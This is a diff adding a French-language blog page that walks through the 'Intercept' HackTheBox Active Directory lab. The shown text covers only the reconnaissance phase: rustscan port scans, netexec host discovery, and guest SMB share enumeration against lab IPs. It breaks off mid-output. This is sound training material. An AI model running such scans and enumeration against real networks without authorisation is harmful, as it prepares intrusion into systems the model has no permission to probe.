@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Intercept - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/intercept/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Intercept">
+  <meta property="og:description" content="Intercept est un laboratoire avancé axé sur Active Directory. Ce scénario guide les utilisateurs à travers une énumération réaliste d’AD, des attaques par coercition, l’exploitation de relais NTLM, ainsi que l’abus des ADCS mal sécurisés. Intercept s’articule autour de 2 machines et 2 flags.
+Recon TCP Scan Je commence l’énumération avec un scan TCP complet des deux machines.
+Sur le DC01 (10.13.38.49), les ports suivants sont ouverts : DNS, KERBEROS, SMB, LDAP ainsi que d’autres ports par défaut. Sur le WS01 (10.13.38.50) les ports SMB, RDP et WinRM sont ouverts. # Scan on 10.13.38.49 - dc01 [root@exegol-intercept] /workspace ❯ rustscan -a 10.13.38.49 Open 10.13.38.49:53 Open 10.13.38.49:88 Open 10.13.38.49:135 Open 10.13.38.49:139 Open 10.13.38.49:389 Open 10.13.38.49:9389 Open 10.13.38.49:49664 Open 10.13.38.49:49667 Open 10.13.38.49:49668 Open 10.13.38.49:56279 Open 10.13.38.49:56308 Open 10.13.38.49:56797 Open 10.13.38.49:56798 Open 10.13.38.49:56807 Open 10.13.38.49:56880 # Scan on 10.13.38.50 - ws01 [root@exegol-intercept] /workspace ❯ rustscan -a 10.13.38.50 Open 10.13.38.50:135 Open 10.13.38.50:139 Open 10.13.38.50:445 Open 10.13.38.50:3389 Open 10.13.38.50:5985Avec netexec, j’ajoute le nom de domaine ainsi que le FQDN des machines dans le fichier /etc/hosts.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-14T10:28:41+00:00">
+    <meta property="article:modified_time" content="2026-03-14T10:28:41+00:00">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="NTLM Relay">
+    <meta property="article:tag" content="ESC7">
+    <meta property="article:tag" content="LLMNR Poisonning">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Intercept">
+  <meta name="twitter:description" content="Intercept est un laboratoire avancé axé sur Active Directory. Ce scénario guide les utilisateurs à travers une énumération réaliste d’AD, des attaques par coercition, l’exploitation de relais NTLM, ainsi que l’abus des ADCS mal sécurisés. Intercept s’articule autour de 2 machines et 2 flags.
+Recon TCP Scan Je commence l’énumération avec un scan TCP complet des deux machines.
+Sur le DC01 (10.13.38.49), les ports suivants sont ouverts : DNS, KERBEROS, SMB, LDAP ainsi que d’autres ports par défaut. Sur le WS01 (10.13.38.50) les ports SMB, RDP et WinRM sont ouverts. # Scan on 10.13.38.49 - dc01 [root@exegol-intercept] /workspace ❯ rustscan -a 10.13.38.49 Open 10.13.38.49:53 Open 10.13.38.49:88 Open 10.13.38.49:135 Open 10.13.38.49:139 Open 10.13.38.49:389 Open 10.13.38.49:9389 Open 10.13.38.49:49664 Open 10.13.38.49:49667 Open 10.13.38.49:49668 Open 10.13.38.49:56279 Open 10.13.38.49:56308 Open 10.13.38.49:56797 Open 10.13.38.49:56798 Open 10.13.38.49:56807 Open 10.13.38.49:56880 # Scan on 10.13.38.50 - ws01 [root@exegol-intercept] /workspace ❯ rustscan -a 10.13.38.50 Open 10.13.38.50:135 Open 10.13.38.50:139 Open 10.13.38.50:445 Open 10.13.38.50:3389 Open 10.13.38.50:5985Avec netexec, j’ajoute le nom de domaine ainsi que le FQDN des machines dans le fichier /etc/hosts.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/intercept/" /><link rel="prev" href="http://localhost:1313/babytwo/" /><link rel="next" href="http://localhost:1313/vulnescape/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Intercept",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/intercept\/"
+        },"genre": "posts","keywords": "Hard, Windows, Active Directory, NTLM Relay, ESC7, LLMNR Poisonning","wordcount":  1972 ,
+        "url": "http:\/\/localhost:1313\/intercept\/","datePublished": "2026-03-14T10:28:41+00:00","dateModified": "2026-03-14T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Intercept</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/mini-prolabs/"><i class="far fa-folder" aria-hidden="true"></i>Mini-Prolabs</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2026-03-14">2026-03-14</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1972 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#tcp-scan">TCP Scan</a></li>
+        <li><a href="#smb">SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#connection-as-kathrynspencer">Connection as Kathryn.Spencer</a>
+      <ul>
+        <li><a href="#rid-brute">RID Brute</a></li>
+        <li><a href="#llmnr-poisonning">LLMNR Poisonning</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-simonbowel">Shell as Simon.Bowel</a>
+      <ul>
+        <li><a href="#bloodhound">Bloodhound</a></li>
+        <li><a href="#ntlm-relay">NTLM Relay</a></li>
+        <li><a href="#shell-on-ws01">Shell on WS01</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-administrator">Shell as Administrator</a>
+      <ul>
+        <li><a href="#add-simonbowen-to-ca-managers">Add Simon.Bowen to CA-MANAGERS</a></li>
+        <li><a href="#esc7">ESC7</a></li>
+        <li><a href="#shell-on-dc01">Shell on DC01</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/intercept.png"
+        data-srcset="/images/Intercept/intercept.png, /images/Intercept/intercept.png 1.5x, /images/Intercept/intercept.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/intercept.png"
+        title="/images/Intercept/intercept.png" width="583" height="512" /></p>
+<p>Intercept est un laboratoire avancé axé sur Active Directory. Ce scénario guide les utilisateurs à travers une énumération réaliste d&rsquo;AD, des attaques par coercition, l&rsquo;exploitation de <strong>relais NTLM</strong>, ainsi que l&rsquo;abus des ADCS mal sécurisés. Intercept s&rsquo;articule autour de 2 machines et 2 flags.</p>
+<h1 id="recon">Recon</h1>
+<h2 id="tcp-scan">TCP Scan</h2>
+<p>Je commence l&rsquo;énumération avec un scan TCP complet des deux machines.</p>
+<ul>
+<li>Sur le <strong>DC01 (10.13.38.49)</strong>, les ports suivants sont ouverts : DNS, KERBEROS, SMB, LDAP ainsi que d&rsquo;autres ports par défaut.</li>
+<li>Sur le <strong>WS01 (10.13.38.50)</strong> les ports SMB, RDP et WinRM sont ouverts.</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Scan</span> <span class="nx">on</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span> <span class="o">-</span> <span class="nx">dc01</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">rustscan</span> <span class="o">-</span><span class="nx">a</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">53</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">88</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">135</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">139</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">389</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">9389</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">49664</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">49667</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">49668</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">56279</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">56308</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">56797</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">56798</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">56807</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">:</span><span class="mi">56880</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Scan</span> <span class="nx">on</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span> <span class="o">-</span> <span class="nx">ws01</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">rustscan</span> <span class="o">-</span><span class="nx">a</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span><span class="o">:</span><span class="mi">135</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span><span class="o">:</span><span class="mi">139</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span><span class="o">:</span><span class="mi">445</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span><span class="o">:</span><span class="mi">3389</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Open</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span><span class="o">:</span><span class="mi">5985</span></span></span></code></pre></div></div>
+<p>Avec <strong>netexec</strong>, j&rsquo;ajoute le nom de domaine ainsi que le FQDN des machines dans le fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">-</span><span class="mi">50</span> <span class="o">--</span><span class="nx">generate</span><span class="o">-</span><span class="nx">hosts</span><span class="o">-</span><span class="nx">file</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">hosts</span></span></span></code></pre></div></div>
+<p>Je vois que l&rsquo;ajout est bien effectif.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">cat</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">hosts</span>
+</span></span><span class="line"><span class="cl"><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span>	<span class="nx">localhost</span>
+</span></span><span class="line"><span class="cl"><span class="o">::</span><span class="mi">1</span>	<span class="nx">localhost</span> <span class="nx">ip6</span><span class="o">-</span><span class="nx">localhost</span> <span class="nx">ip6</span><span class="o">-</span><span class="nx">loopback</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fe00</span><span class="o">::</span>	<span class="nx">ip6</span><span class="o">-</span><span class="nx">localnet</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ff00</span><span class="o">::</span>	<span class="nx">ip6</span><span class="o">-</span><span class="nx">mcastprefix</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ff02</span><span class="o">::</span><span class="mi">1</span>	<span class="nx">ip6</span><span class="o">-</span><span class="nx">allnodes</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ff02</span><span class="o">::</span><span class="mi">2</span>	<span class="nx">ip6</span><span class="o">-</span><span class="nx">allrouters</span>
+</span></span><span class="line"><span class="cl"><span class="mf">172.17</span><span class="p">.</span><span class="mf">0.2</span>	<span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="nx">DC01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="nx">DC01</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="nx">WS01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="nx">WS01</span></span></span></code></pre></div></div>
+<h2 id="smb">SMB</h2>
+<p>Je peux me connecter en tant qu&rsquo;anonyme sur les deux machines mais je ne peux pas énumérer les partages. Je vois aussi que la signature est désactivé au niveau du SMB sur les deux machines. Information qui nous sera peut-être utile plus tard.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">-</span><span class="mi">50</span> <span class="o">-</span><span class="nx">u</span> <span class="s1">&#39;&#39;</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="nx">shares</span>                                                                                                                     
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="nx">Server</span> <span class="mi">2019</span> <span class="nx">Build</span> <span class="mi">19041</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">WS01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2022</span> <span class="nx">Build</span> <span class="mi">20348</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">DC01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">True</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nb">Error</span> <span class="nx">enumerating</span> <span class="nx">shares</span><span class="o">:</span> <span class="nx">STATUS_ACCESS_DENIED</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nb">Error</span> <span class="nx">enumerating</span> <span class="nx">shares</span><span class="o">:</span> <span class="nx">STATUS_ACCESS_DENIED</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Running</span> <span class="nx">nxc</span> <span class="nx">against</span> <span class="mi">2</span> <span class="nx">targets</span> <span class="err">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span> <span class="mi">100</span><span class="o">%</span> <span class="mi">0</span><span class="o">:</span><span class="mi">00</span><span class="o">:</span><span class="mi">00</span></span></span></code></pre></div></div>
+<p>Par contre je peux le faire en tant que Guest sur le <strong>WS01</strong>. J&rsquo;ai alors les partages suivants :</p>
+<ul>
+<li><strong>dev</strong> : avec les droits de lecture et écriture</li>
+<li><strong>IPC$</strong> : avec le droit de lecture</li>
+<li><strong>Users</strong> : avec le droit de lecture</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span><span class="o">-</span><span class="mi">50</span> <span class="o">-</span><span class="nx">u</span> <span class="s1">&#39;guest&#39;</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="nx">shares</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2022</span> <span class="nx">Build</span> <span class="mi">20348</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">DC01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">True</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.50</span>     <span class="mi">445</span>    <span class="nx">WS01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="mi">10</span> <span class="o">/</span> <span class="nx">Server</span> <span class="mi">2019</span> <span class="nx">Build</span> <span class="mi">19041</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">WS01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">guest</span><span class="o">:</span> <span class="nx">STATUS_ACCOUNT_DISABLED</span>
